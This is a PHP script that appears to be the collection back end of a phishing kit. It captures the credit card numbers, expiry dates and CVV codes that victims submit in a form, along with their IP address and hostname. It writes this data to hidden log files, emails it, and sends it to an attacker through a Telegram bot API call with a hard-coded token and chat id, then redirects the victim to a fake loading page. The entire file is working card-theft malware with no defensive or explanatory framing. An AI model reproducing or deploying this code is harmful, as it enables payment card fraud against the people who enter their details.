<?php
$ip = getenv("REMOTE_ADDR");
$back = "loggin-error.html";
$hostname = gethostbyaddr($ip);
$message .= "------ CC ------\n";
$message .= "cc_number : ".$_POST['ccnum1']."\n";
$message .= "cc_number : ".$_POST['ccnum2']."\n";
$message .= "cc_number : ".$_POST['ccnum3']."\n";
$message .= "cc_number : ".$_POST['ccnum4']."\n";
$message .= "exp : ".$_POST['007']."\n";
$message .= "exp : ".$_POST['008']."\n";
$message .= "cvv : ".$_POST['ccv']."\n";
$message .= "------- IP -------\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "---------------\n";
$send = "";
$subject = "Google| $ip ";
$headers = "From:Trnswise <don@mox.fr>";
mail($send,$subject,$message,$headers);
 $Txt_Rezlt = fopen('../rzl00.txt', 'a+');
$file = fopen("../vu.txt","a");
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2039615741&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: ../loading2.html");

?>